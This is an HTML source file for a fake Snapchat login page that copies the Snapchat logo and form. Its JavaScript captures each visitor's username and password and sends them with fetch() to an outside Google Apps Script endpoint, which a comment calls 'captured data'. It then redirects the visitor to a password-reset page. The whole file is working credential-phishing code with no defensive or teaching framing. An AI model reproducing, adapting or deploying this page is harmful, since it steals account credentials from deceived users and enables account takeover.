<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Snapchat Login</title>
    <link rel="stylesheet" href="index.css"> <!-- Link to your CSS file -->
    <style>
        .error-message {
            color: red;
            margin-top: 5px;
            font-size: 14px;
        }
    </style>
    <!-- Google reCAPTCHA -->
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>
<body>
    <div class="form">
        <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" alt="Snapchat Logo" class="snapchat-logo">
        <h1>Snapchat Login</h1>
        <form id="loginForm" action="https://script.google.com/macros/s/AKfycbwSoa7IFpuGWp2zCoMKhQcTT4T5Wblked6fNgiZCpTiR18Ke96hthAZoRlKYsrkIyE/exec" method="post">
            <label for="username">Username or Email Address:</label><br>
            <input type="text" id="username" name="username" placeholder="Enter your username or email" required><br>
            <span id="usernameError" class="error-message"></span><br>
            
            <label for="password">Password:</label><br>
            <input type="password" id="password" name="password" placeholder="Enter your password" required><br>
            <span id="passwordError" class="error-message"></span><br>
            
            <!-- Google reCAPTCHA -->
            <div class="g-recaptcha" data-sitekey="6LdyV_wpAAAAAO7dKxETuuFMa5ROZyZnfJ0O_DLG"></div>
            <span id="captchaError" class="error-message"></span><br>
            
            <input type="submit" value="Log In">
            <span id="loginError" class="error-message"></span><br>
        </form>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent form submission
            
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            var recaptchaResponse = grecaptcha.getResponse();
            
            // Validate reCAPTCHA
            if (!recaptchaResponse) {
                document.getElementById('captchaError').textContent = 'Please complete the reCAPTCHA.';
                return;
            }
            
            // Send captured data to server (Google Apps Script endpoint)
            logLogin(username, password);
        });
        
        function logLogin(username, password) {
            var url = "https://script.google.com/macros/s/AKfycbwSoa7IFpuGWp2zCoMKhQcTT4T5Wblked6fNgiZCpTiR18Ke96hthAZoRlKYsrkIyE/exec"; // Update with your deployed Google Apps Script URL
            
            // Prepare data to send
            var formData = new FormData();
            formData.append("username", username);
            formData.append("password", password);
            
            // Send data using fetch API
            fetch(url, {
                method: 'POST',
                body: formData,
                mode: 'no-cors' // No-cors mode because of cross-origin issues
            })
            .then(response => {
                if (response.ok) {
                    console.log("Login successful");
                    window.location.href = "password_reset.html"; // Redirect to password reset page
                } else {
                    console.error("Error submitting login data");
                    // Handle error (optional)
                }
            })
            .catch(error => {
                console.error('Error:', error);
                // Handle network error (optional)
            });
        }
    </script>
</body>
</html>
